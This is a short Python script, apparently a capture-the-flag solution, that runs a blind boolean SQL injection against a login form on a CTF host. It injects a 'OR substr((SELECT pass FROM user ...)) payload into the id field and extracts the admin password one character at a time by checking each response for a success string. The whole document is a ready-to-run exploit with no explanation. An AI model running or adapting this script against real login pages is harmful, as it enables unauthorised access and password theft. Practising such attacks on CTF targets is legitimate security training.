import requests

def is_login_success(response_str):
    return "Congratulations!" in response_str

def try_char(index, char):
    payload = {
        "id": "'OR substr((SELECT pass FROM user WHERE id='admin'), {}, 1)='{}' --".format(index, char),
        "pass": ""
    }
    res = requests.post("http://ctfq.sweetduet.info:10080/~q6/", data=payload)
    if is_login_success(res.text):
        print(char, end="", flush=True)
        return

chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()=~|-^\`{@[+*};:],./_<>?\"\'"

print("[Processing...] Password is: ", end="", flush=True)

for index in range(1,22):
    for char in chars:
        try_char(index,char)

print("\nComplete")
